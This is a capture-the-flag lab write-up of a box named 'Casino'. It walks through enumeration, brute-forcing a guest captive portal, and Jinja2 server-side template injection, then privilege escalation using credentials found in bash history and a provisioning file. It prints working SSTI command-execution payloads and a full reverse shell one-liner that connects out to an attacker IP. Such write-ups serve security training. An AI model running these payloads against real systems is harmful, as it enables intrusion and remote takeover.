---
title: "Casino"
date: 2026-11-15T00:43:00-08:00
draft: false
tags: ["hacksmarter", "linux", "web", "ssti", "privilege-escalation", "oscp", "writeup"]
categories: ["Writeups"]
cover:
  image: "cover.jpg"
  relative: true
  alt: "Hack Smarter World Portal"
ShowToc: true
TocOpen: false
summary: "A medium HackSmarter Linux box writeup. Objective: Can we get to root?"
---

Box name - Casino

Difficulty - Medium

![Casino-01-objective](Casino-01-objective.png)

Objective: Can we get to root?

---

## Initial Enumeration

```
rustscan -a Casino -- -A
```

We find a few open ports, 22, 80 and 2222.
```
Open 10.1.86.194:22
Open 10.1.86.194:80
Open 10.1.86.194:2222
```

Some important versions!
```
Port 22 - OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
Port 80 - Werkzeug httpd 3.1.8 (Python 3.10.18)
Port 2222 - OpenSSH 8.4p1 Debian 5+deb11u7
```

Port 22, no password based authentication, but port 2222 does.. hmm.

We checked out the homepage of the webserver first.!

Our home webpage! Looks like a guest sign-in for their network.

I'm going to run a dir search in the background and see if there is anything interesting while I go through this. Will include if necessary.

![Casino-03-login-page](Casino-03-login-page.png)

---

## Captive Portal

![Casino-04-room-min](Casino-04-room-min.png)

Room Number value no less than 101. Interesting!

![Casino-05-auth-failed](Casino-05-auth-failed.png)

Room Number 101 -> Last name: Smith -> authenticated failed. Just checking to see what our webpage response is.

It looks the number maximum value is 599! Sweet.

We think there is a database in the backend because we are inputting two values.

Both blank = “Please provide”

Ok so now we know so far.

101 - 599 -> Room Numbers
Let's try a brute force maybe?

Here's a list of family names that I ended up adding to mpayload. Same with 0-1000 numbers. We opened up and crafted a request.

https://github.com/righteousgambit/quiet-riot/blob/main/wordlists/familynames-usa-top1000.txt

https://gitlab.com/kalilinux/packages/seclists/-/blob/upstream/Fuzzing/3-digits-000-999.txt?ref_type=heads

I ended up crafting the text file to go between 100-599.

![Casino-06-intruder-payloads](Casino-06-intruder-payloads.png)

room_number parameter contains the payload for numbers, last_name parameter contains the family last name payloads.

We used a `matrix` attack!

We got some hits! The length is different, the round-trip is different, and the redirection page is different. Let's dig in..

![Casino-07-intruder-hits](Casino-07-intruder-hits.png)

Ignore the top part of the image, this was one of the successful payloads!

![Casino-08-login-105-smith](Casino-08-login-105-smith.png)

![Casino-09-bandwidth-vlan](Casino-09-bandwidth-vlan.png)

It's fast!! And on a V-LAN!!!!

Should we scan this network?

Not yet..

---

## SSTI

![Casino-10-profile](Casino-10-profile.png)

Immediately I see that we can change our name, I immediately think SSTI! It's reflected back to us..

![Casino-11-name-reflected](Casino-11-name-reflected.png)

Let's try some of the payloads from our HackSmarter Web App Series.

The first one is Jinja2 (Python) test. We saw it running on our Webserver from our initial enumeration.

![Casino-12-ssti-payloads](Casino-12-ssti-payloads.png)

![Casino-13-ssti-49](Casino-13-ssti-49.png)


Boom! It worked!

Let's do a test payload with `{{config}}`. I ended up using gunyakit's command cheat sheet. https://github.com/gunyakit/command-cheatsheet/blob/main/7.Web-Exploit/7.6.SSTI.md#jinja2-python

![Casino-14-config](Casino-14-config.png)

```
SECRET_KEY = [REDACTED]
```

Do we need this?

Our Jinja2 command to do remote code execution!

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

![Casino-15-rce-id](Casino-15-rce-id.png)

We found a user!: www-data

Using the same command, we find other users on the machine.

![Casino-16-passwd-web](Casino-16-passwd-web.png)

I copied and pasted the data to a file to grep and see if we have any shells.

![Casino-17-passwd-grep](Casino-17-passwd-grep.png)

We find two users with potentially interactive shells, we have david, and george!

---

## Reverse Shell

I found online a reverse shell for Jinja2, which was really cool.

![Casino-18-jinja2-revshell](Casino-18-jinja2-revshell.png)

Here's our command, thanks to[ jayaye15](https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6).

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.200.120.104\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

Let's set up our listener.

![Casino-19-listener](Casino-19-listener.png)

Our shell worked! Here's also the output on our web page.

![Casino-20-shell-webpage](Casino-20-shell-webpage.png)

---

## Access as George

We know george and david exist, we know that david doesn't have ssh, but maybe george does?

George has ssh key! Let's grab it, and add it to ours?

I got stuck here, apparently the ssh id_rsa keys did not work with ssh no matter how hard I tried.

![Casino-26-ssh-id-rsa-fail](Casino-26-ssh-id-rsa-fail.png)

That didn't work.. let's just grab user.txt

![Casino-21-user-txt](Casino-21-user-txt.png)

Let's just check the rest of the home folder.

![Casino-22-bash-history](Casino-22-bash-history.png)

Nice! We found some more creds! I skipped the resort_db SQL command because we already saw that once we first entered the www-data account. I did not include a screenshot of this, but it was located in /app/app.

---

## Root Flag

Let's enumerate our user, we found an interesting group.

![Casino-23-groups](Casino-23-groups.png)

Let's check our groups permissions and see if we can find any files that we can run.

![Casino-24-term-log](Casino-24-term-log.png)

Read through all of this and didn't seem like anything.

Let's try the other file!

![Casino-25-provisioning-root](Casino-25-provisioning-root.png)

We found root! Very cool! We did an `su` to the user and tried the password.

GG. <3
